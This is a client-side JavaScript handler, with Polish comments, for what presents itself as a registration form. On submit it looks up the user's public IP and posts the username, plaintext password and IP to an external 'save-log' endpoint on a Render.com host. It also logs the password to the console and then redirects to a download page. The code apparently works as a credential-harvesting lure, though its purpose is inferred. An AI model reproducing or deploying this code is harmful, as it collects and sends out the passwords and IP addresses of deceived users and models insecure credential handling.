document.getElementById('registrationForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    
    // Walidacja
    if (password !== confirmPassword) {
        showMessage('Hasła nie są identyczne!', 'error');
        return;
    }
    
    if (username.length < 3) {
        showMessage('Nazwa użytkownika musi mieć co najmniej 3 znaki!', 'error');
        return;
    }
    
    if (password.length < 6) {
        showMessage('Hasło musi mieć co najmniej 6 znaków!', 'error');
        return;
    }

    // Pokaz loading
    showLoading(true);
    showMessage('', '');

    try {
        console.log('🔄 Rozpoczynanie rejestracji...');
        
        // Pobierz IP użytkownika
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const userIP = ipData.ip;

        console.log('📨 Wysyłanie danych:', { username, password, ip: userIP });

        // Wyślij do backendu na Render.com
        const response = await fetch('https://social-tools.onrender.com/save-log', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                username: username,
                password: password,
                ip: userIP
            })
        });

        const result = await response.json();
        console.log('📩 Odpowiedź z serwera:', result);
        
        if (result.success) {
            showMessage('🎉 Rejestracja udana! Przekierowuję...', 'success');
            // Przekierowanie do download.html po 2 sekundach
            setTimeout(() => {
                window.location.href = 'download.html';
            }, 2000);
        } else {
            showMessage('❌ Błąd: ' + result.message, 'error');
        }
    } catch (error) {
        console.error('💥 Błąd:', error);
        showMessage('❌ Wystąpił błąd podczas rejestracji', 'error');
    } finally {
        showLoading(false);
    }
});

function showLoading(show) {
    document.getElementById('loading').style.display = show ? 'block' : 'none';
}

function showMessage(message, type) {
    const messageEl = document.getElementById('message');
    messageEl.textContent = message;
    messageEl.className = 'message ' + type;
    messageEl.style.display = message ? 'block' : 'none';
}
